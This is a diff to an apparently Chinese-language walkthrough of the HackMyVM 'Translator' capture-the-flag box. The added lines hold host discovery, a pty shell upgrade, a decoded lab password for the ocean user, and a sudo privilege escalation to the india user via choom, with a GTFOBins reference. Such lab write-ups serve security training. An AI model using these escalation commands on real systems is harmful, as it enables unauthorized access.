@@ -1,3 +1,4 @@
+[HackMyVm - Translator - YouTube](https://www.youtube.com/watch?v=xs6Pw9y_Ayg)
 # 主机发现
 ```C
 netdiscover -i eth0 -r 192.168.44.193/24
@@ -61,14 +62,19 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 尝试读取第一个flag读取不到cat /home/ocean/user.txt
 
 ```C
+cat hvxivg
+
 ┌──(kali㉿kali)-[~/桌面/OSCP]
 └─$ python translater.py Mb+kzhhdliw+rh+zbfie3w4          
 Mb+kzhhdliw+rh+zbfie3w4
 ny password is ayurv3d4
 ```
-
+利用sudo 提权到india 账号
+https://gtfobins.github.io/gtfobins/choom/
 ```C
-su ocean
+su ocean //输入密码：ayurv3d4
+sudo -l
+//发现有个(india) NOPASSWD: /usr/bin/choom   这可以让我免密提权至india用户权限
 sudo -u india /usr/bin/choom -n 0 /bin/sh
 script /dev/null -c bash
 ```
